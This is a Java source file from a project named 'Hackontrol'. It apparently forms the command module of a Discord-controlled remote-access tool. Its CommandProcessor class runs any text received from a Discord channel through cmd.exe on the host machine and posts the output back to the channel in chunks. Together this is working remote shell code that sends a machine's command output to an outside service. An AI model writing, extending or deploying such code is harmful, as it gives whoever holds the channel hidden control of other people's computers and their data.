package com.khopan.hackontrol.channel.command;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;

public class CommandProcessor {
	private static int Number;

	private CommandProcessor(String command, MessageChannel channel) {
		try {
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			builder.directory(CommandChannel.CurrentDirectory);
			Process process = builder.start();
			InputStream stream = process.getInputStream();
			byte[] data = stream.readAllBytes();
			stream.close();
			String content = new String(data, StandardCharsets.UTF_8);
			List<String> parts = this.getParts(content, 1992);

			for(int i = 0; i < parts.size(); i++) {
				String part = parts.get(i);
				channel.sendMessage("```\n" + part + "\n```").queue();
			}
		} catch(Throwable Errors) {
			HackontrolError.throwable(MessageChannelSendable.of(channel), Errors);
		}
	}

	private List<String> getParts(String text, int partitionSize) {
		List<String> parts = new ArrayList<String>();
		int length = text.length();

		for(int i = 0; i < length; i += partitionSize) {
			parts.add(text.substring(i, Math.min(length, i + partitionSize)));
		}

		return parts;
	}

	public static void process(String command, MessageChannel channel) {
		Thread thread = new Thread(() -> {
			new CommandProcessor(command, channel);
			CommandProcessor.Number--;
		});

		thread.setName("Hackontrol Command Processor Thread #" + (++CommandProcessor.Number));
		thread.setPriority(4);
		thread.start();
	}
}
